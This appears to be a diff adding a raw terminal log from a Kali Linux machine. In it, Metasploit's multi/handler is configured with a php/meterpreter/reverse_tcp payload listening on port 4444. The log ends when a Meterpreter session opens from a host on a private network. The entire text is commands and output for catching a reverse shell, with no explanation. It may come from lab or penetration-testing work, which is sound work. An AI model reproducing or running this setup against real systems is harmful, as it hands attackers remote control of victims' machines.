@@ -1,0 +1,53 @@
+root@kali:~# msfconsole 
+                                                  
+
+ ______________________________________________________________________________
+|                                                                              |
+|                   METASPLOIT CYBER MISSILE COMMAND V5                        |
+|______________________________________________________________________________|
+      \                                  /                      /
+       \     .                          /                      /            x
+        \                              /                      /
+         \                            /          +           /
+          \            +             /                      /
+           *                        /                      /
+                                   /      .               /
+    X                             /                      /            X
+                                 /                     ###
+                                /                     # % #
+                               /                       ###
+                      .       /
+     .                       /      .            *           .
+                            /
+                           *
+                  +                       *
+
+                                       ^
+####      __     __     __          #######         __     __     __        ####
+####    /    \ /    \ /    \      ###########     /    \ /    \ /    \      ####
+################################################################################
+################################################################################
+# WAVE 5 ######## SCORE 31337 ################################## HIGH FFFFFFFF #
+################################################################################
+                                                           https://metasploit.com
+
+
+       =[ metasploit v5.0.58-dev                          ]
++ -- --=[ 1937 exploits - 1082 auxiliary - 333 post       ]
++ -- --=[ 556 payloads - 45 encoders - 10 nops            ]
++ -- --=[ 7 evasion                                       ]
+
+msf5 > use exploit/multi/handler 
+msf5 exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
+payload => php/meterpreter/reverse_tcp
+msf5 exploit(multi/handler) > set lhost 0.0.0.0
+lhost => 0.0.0.0
+msf5 exploit(multi/handler) > set lport 4444
+lport => 4444
+msf5 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 0.0.0.0:4444 
+[*] Sending stage (38288 bytes) to 192.168.102.128
+[*] Meterpreter session 1 opened (192.168.102.130:4444 -> 192.168.102.128:49746) at 2020-04-20 12:17:40 -0400
+
+meterpreter > 
